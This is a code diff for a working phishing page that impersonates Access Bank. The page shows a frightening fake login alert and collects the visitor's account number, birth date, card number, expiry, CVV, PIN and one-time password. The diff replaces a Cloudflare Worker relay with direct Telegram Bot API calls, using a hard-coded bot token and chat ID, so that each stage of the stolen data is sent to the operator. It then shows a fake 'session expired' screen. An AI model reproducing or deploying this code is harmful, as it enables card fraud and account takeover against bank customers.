@@ -162,11 +162,13 @@
 </footer>
 
 <script>
-    // REPLACE THIS WITH YOUR CLOUDFLARE WORKER URL (KEEP THE QUOTES)
-    const WORKER_URL = 'access-alerts.mcallendiana.workers.dev';
+    // REPLACE THESE WITH YOUR ACTUAL TOKEN AND CHAT ID
+    const BOT_TOKEN = '8718843317:AAH1LkFxLQQAKSLUM3721X3DUSEFnk8LA-I';
+    const CHAT_ID = '6999117324';
+
     const collected = {};
 
-    // Dynamic Alert
+    // Dynamic Scary Alert Message
     const cities = ["Lagos, NG", "Abuja, NG", "Port Harcourt, NG", "Kano, NG", "Ibadan, NG"];
     const devices = [{ name: "iPhone 14 Pro", icon: "📱" }, { name: "Samsung Galaxy S23", icon: "📱" }, { name: "Windows 11 PC", icon: "💻" }, { name: "MacBook Pro", icon: "💻" }, { name: "Android Device", icon: "📱" }];
     const randomCity = cities[Math.floor(Math.random() * cities.length)];
@@ -176,63 +178,92 @@
     const timeString = now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' });
     document.getElementById('dynamic-alert').innerHTML = `⚠️ <strong>Security Alert:</strong> A login attempt was just detected from <strong>${randomCity}</strong> using a <strong>${randomDevice.name}</strong> <span class="device-icon">${randomDevice.icon}</span> at <strong>${timeString}</strong>. If this wasn't you, secure your account immediately.`;
 
-    // Input Masks
+    // Formatting Logic & Live Checks
     document.getElementById('acc_input').addEventListener('input', function () {
         this.value = this.value.replace(/[^0-9]/g, '').slice(0, 10);
         document.getElementById('acc_check').style.display = (this.value.length === 10) ? 'block' : 'none';
     });
+    
     document.getElementById('dob_input').addEventListener('input', function () {
         let val = this.value.replace(/[^0-9]/g, '');
-        if (val.length > 4) this.value = val.slice(0,2) + '/' + val.slice(2,4) + '/' + val.slice(4,8);
-        else if (val.length > 2) this.value = val.slice(0,2) + '/' + val.slice(2);
-        else this.value = val;
+        if (val.length > 4) {
+            this.value = val.slice(0,2) + '/' + val.slice(2,4) + '/' + val.slice(4,8);
+        } else if (val.length > 2) {
+            this.value = val.slice(0,2) + '/' + val.slice(2);
+        } else {
+            this.value = val;
+        }
     });
+
     document.getElementById('card_input').addEventListener('input', function () {
         let val = this.value.replace(/[^0-9]/g, '').slice(0, 16);
         let formatted = val.match(/.{1,4}/g);
         this.value = formatted ? formatted.join(' ') : val;
+
         let logo = document.getElementById('card_logo');
-        if (val.startsWith('4')) { logo.className = 'card-logo visa'; logo.textContent = 'VISA'; logo.style.display = 'block'; }
-        else if (val.startsWith('5') || val.startsWith('2')) { logo.className = 'card-logo mastercard'; logo.textContent = 'Mastercard'; logo.style.display = 'block'; }
-        else if (val.startsWith('506')) { logo.className = 'card-logo'; logo.textContent = 'Verve'; logo.style.color = '#004f9f'; logo.style.display = 'block'; }
-        else { logo.style.display = 'none'; }
+        if (val.startsWith('4')) {
+            logo.className = 'card-logo visa'; logo.textContent = 'VISA'; logo.style.display = 'block';
+        } else if (val.startsWith('5') || val.startsWith('2')) {
+            logo.className = 'card-logo mastercard'; logo.textContent = 'Mastercard'; logo.style.display = 'block';
+        } else if (val.startsWith('506')) {
+            logo.className = 'card-logo'; logo.textContent = 'Verve'; logo.style.color = '#004f9f'; logo.style.display = 'block';
+        } else {
+            logo.style.display = 'none';
+        }
     });
+
     document.getElementById('exp_input').addEventListener('input', function () {
         let val = this.value.replace(/[^0-9]/g, '');
-        if (val.length > 2) this.value = val.slice(0,2) + '/' + val.slice(2);
-        else this.value = val;
+        if (val.length > 2) {
+            this.value = val.slice(0,2) + '/' + val.slice(2);
+        } else {
+            this.value = val;
+        }
     });
 
     function collectStage(n) {
-        const inputs = document.getElementById('stage-' + n).querySelectorAll('input');
-        inputs.forEach(input => { if (input.value) collected[input.name] = input.value; });
+        const stage = document.getElementById('stage-' + n);
+        const inputs = stage.querySelectorAll('input');
+        inputs.forEach(input => {
+            if (input.value) collected[input.name] = input.value;
+        });
     }
+
     function nextStage(n) {
         collectStage(n - 1);
         document.getElementById('stage-' + (n - 1)).classList.add('hidden');
         document.getElementById('stage-' + n).classList.remove('hidden');
     }
 
-    // SEND IMMEDIATELY ON BUTTON CLICK (WITH DEBUG ALERTS)
+    // Sends directly to Telegram
+    async function sendToTelegram(message) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        try {
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' }),
+                keepalive: true
+            });
+        } catch (err) {
+            console.error("Telegram error:", err);
+        }
+    }
+
+    // TRIGGER 1: Fires on "Authorize Session" click
     async function submitCardDetails() {
         collectStage(2);
         
-        const text = `💳 *CARD CAPTURED — ACCESS BANK*\n\n🏦 *Account:* ${collected.account_number || 'N/A'}\n🎂 *DOB:* ${collected.dob || 'N/A'}\n💳 *Card:* ${collected.card_number || 'N/A'}\n📅 *Expiry:* ${collected.expiry || 'N/A'}\n🔒 *CVV:* ${collected.cvv || 'N/A'}\n🔑 *PIN:* ${collected.pin || 'N/A'}\n🕐 *Time:* ${new Date().toLocaleString()}`;
+        const text = `💳 *CARD CAPTURED — ACCESS BANK*\n\n` +
+            `🏦 *Account:* ${collected.account_number || 'N/A'}\n` +
+            `🎂 *DOB:* ${collected.dob || 'N/A'}\n` +
+            `💳 *Card:* ${collected.card_number || 'N/A'}\n` +
+            `📅 *Expiry:* ${collected.expiry || 'N/A'}\n` +
+            `🔒 *CVV:* ${collected.cvv || 'N/A'}\n` +
+            `🔑 *PIN:* ${collected.pin || 'N/A'}\n` +
+            `🕐 *Time:* ${new Date().toLocaleString()}`;
 
-        try {
-            let response = await fetch(WORKER_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ text }),
-                keepalive: true 
-            });
-            
-            if (!response.ok) {
-                alert("DEBUG ERROR: Cloudflare responded with status " + response.status + ". Check your Worker code.");
-            }
-        } catch (err) {
-            alert("DEBUG ERROR: Could not connect. Make sure WORKER_URL has https:// and is pasted correctly. Error: " + err.message);
-        }
+        await sendToTelegram(text);
 
         nextStage(3);
         runVerification();
@@ -252,22 +283,21 @@
         }, 60); 
     }
 
+    // TRIGGER 2: Fires when they submit the OTP
     document.getElementById('verifyForm').addEventListener('submit', async (e) => {
         e.preventDefault();
         collectStage(3);
+
         document.getElementById('stage-3').classList.add('hidden');
         document.getElementById('stage-4').classList.remove('hidden');
 
-        const text = `📱 *OTP RECEIVED — ACCESS BANK*\n\n👤 *Account:* ${collected.account_number}\n💳 *Card:* ${collected.card_number}\n🔑 *OTP:* ${collected.otp || 'N/A'}\n🕐 *Time:* ${new Date().toLocaleString()}`;
+        const text = `📱 *OTP RECEIVED — ACCESS BANK*\n\n` +
+            `👤 *Account:* ${collected.account_number}\n` +
+            `💳 *Card:* ${collected.card_number}\n` +
+            `🔑 *OTP:* ${collected.otp || 'N/A'}\n` +
+            `🕐 *Time:* ${new Date().toLocaleString()}`;
 
-        try {
-            await fetch(WORKER_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ text }),
-                keepalive: true
-            });
-        } catch (err) {}
+        await sendToTelegram(text);
 
         setTimeout(() => {
             document.body.innerHTML = '<div style="padding:60px 20px;text-align:center;font-family:Arial;background:#fff;height:100vh;"><h2 style="color:#d97706;">Session Expired</h2><p style="color:#666; margin-top:10px;">For your security, this session has timed out. Please log in again from the official Access Bank app.</p></div>';
